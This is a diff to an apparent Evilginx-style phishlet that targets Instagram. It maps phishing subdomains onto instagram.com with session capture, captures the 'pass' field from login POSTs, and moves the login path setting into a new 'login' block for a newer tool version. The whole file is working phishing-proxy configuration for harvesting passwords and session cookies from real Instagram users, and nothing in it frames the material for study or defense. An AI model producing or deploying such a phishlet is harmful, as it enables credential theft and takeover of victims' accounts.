@@ -1,5 +1,5 @@
 author: '@prrrrinncee'
-min_ver: '2.2.0'
+min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}
   - {phish_sub: 'm', orig_sub: 'm', domain: 'instagram.com', session: true, is_landing: false}
@@ -19,5 +19,6 @@ credentials:
     key: 'pass'
     search: '(.*)'
     type: 'post'
-landing_path:
-  - '/accounts/login'
+login:
+  domain: 'www.instagram.com'
+  path: '/accounts/login'
